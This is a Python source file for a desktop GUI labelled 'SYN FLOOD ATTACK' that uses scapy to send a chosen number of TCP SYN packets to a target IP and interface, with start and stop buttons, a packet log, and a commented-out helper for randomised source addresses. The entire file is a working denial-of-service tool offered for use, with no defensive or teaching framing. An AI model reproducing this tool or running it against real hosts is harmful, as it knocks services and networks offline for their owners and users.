from customtkinter import CTk, CTkButton, CTkLabel, CTkEntry, CTkTextbox, CTkFrame, DISABLED, NORMAL, END, set_default_color_theme, set_appearance_mode
from threading import Thread
from scapy.layers.inet import TCP, IP
from random import randint
from scapy.all import Raw, send, RandShort
from tkinter import messagebox


def syn_flood_page():


    def clear_log():
        def clear():
            res_box.configure(state=NORMAL)
            res_box.delete(1.0, END)
            res_box.configure(state=DISABLED)
        Thread(target=clear).start()


    def stop_button_func():

        def stopping():

            global continueval
            continueval = 'False'
        Thread(target=stopping).start()


    def start_button_func():
        def adding(txt):
            res_box.configure(state=NORMAL)
            res_box.insert(END, txt)
            res_box.configure(state=DISABLED)

        def attack():
            try :
                int(packet_entry.get())
            except Exception:
                messagebox.showerror('WARNING', 'PACKETS INPUT SHOULD BE INT TYPE')
                raise TypeError
            adding('ATTACK STARTED !\n')


            global continueval
            continueval = 'True'
            try:
                xy  = 0
                def generate_random_ip():
                    return ".".join(str(randint(0, 255)) for _ in range(4))
            # ------------ getting router ip -----------
                router_ip = (ip_entry.get())
            # ------------ getting interface -----------
                us_iface = interface_entry.get()
            # ------------ getting number of packets -----------
                num = int(packet_entry.get())



                # ip = IP(src=src_ip, dst=router_ip)
                ip = IP(dst=router_ip)
                for i in range(num):
                    if continueval == 'True':
                        target_port = 80
                        # src_ip = generate_random_ip()
                        
                        tcp = TCP(sport=RandShort(), dport=target_port, flags="S")
                        raw = Raw(b'x'*64)
                        packet = ip / tcp / raw
                        send(x=packet, iface=us_iface, verbose=0)
                        adding(f'[+]    PACKET NUMBER {xy} SENT\n')
                        xy += 1
                    else:
                        adding("ATTACK STOPED !\n")
                        break

            except Exception as er:
                adding(er+'\n')
                adding('[!]    ERROR OCCURRED [SYN] \n') 

        Thread(target=attack).start()




    root = CTk()
    root.title('SYN FLOOD')
    root.geometry('700x620')
    root.resizable(False, False)
    set_appearance_mode("dark")
    set_default_color_theme("blue")
    frame = CTkFrame(master=root, corner_radius=10, border_width=2, border_color='red')
    frame.pack(padx=20, pady=20, fill='both', expand=True)
    # --------------------------------------------------------
    # --------------------------------------------------------
    title = CTkLabel(frame, text='SYN FLOOD ATTACK', font=('montserrat', 30, 'bold'))
    title.place(x=160, y=20)



    ip_entry_lbl = CTkLabel(master=frame, text='TARGET IP : ', font=('montserrat', 25, 'bold'))
    ip_entry_lbl.place(x=65, y=100)

    ip_entry = CTkEntry(frame, width=240, height=37, font=('montserrat', 25), placeholder_text='address')
    ip_entry.insert(END, '192.168.1.1')
    ip_entry.place(x=355 ,y=100)

    interface_lbl = CTkLabel(master=frame, text='INTERFACE : ', font=('montserrat', 25, 'bold'))
    interface_lbl.place(x=65, y=150)
    
    interface_entry = CTkEntry(frame, width=240, height=37, font=('montserrat', 25), placeholder_text='start')
    interface_entry.insert(1, 'Wi-Fi')
    interface_entry.place(x=355 ,y=150)


    packet_lbl = CTkLabel(master=frame, text='PACKETS  :', font=('montserrat', 25, 'bold'))
    packet_lbl.place(x=65, y=200)
    
    packet_entry = CTkEntry(frame, width=240, height=37, font=('montserrat', 25), placeholder_text='number')
    packet_entry.insert(1, '500')
    packet_entry.place(x=355 ,y=200)


    start_button  = CTkButton(frame, text='START',width=240, height=40, font=('montserrat', 25), command=start_button_func)
    start_button.place(x=65, y=250)

    stop_button  = CTkButton(frame, text='STOP',width=240, height=40, font=('montserrat', 25), command=stop_button_func)
    stop_button.place(x=355, y=250)

    res_box = CTkTextbox(frame, width=531, height=150, font=('montserrat', 18), border_color='white', border_width=2)
    res_box.configure(state=DISABLED)
    res_box.place(x=65, y=310)

    clear_log_button  = CTkButton(frame, text='CLEAR LOG',width=531, height=40, font=('montserrat', 25), command=clear_log, fg_color='red', hover_color='#A80000')
    clear_log_button.place(x=65, y=475)

    close_button  = CTkButton(frame, text='CLOSE',width=531, height=40, font=('montserrat', 25, 'bold'), command=lambda: root.destroy(), fg_color='red', hover_color='#A80000')
    close_button.place(x=65, y=525)

    root.mainloop()


if __name__ == '__main__' :
    syn_flood_page()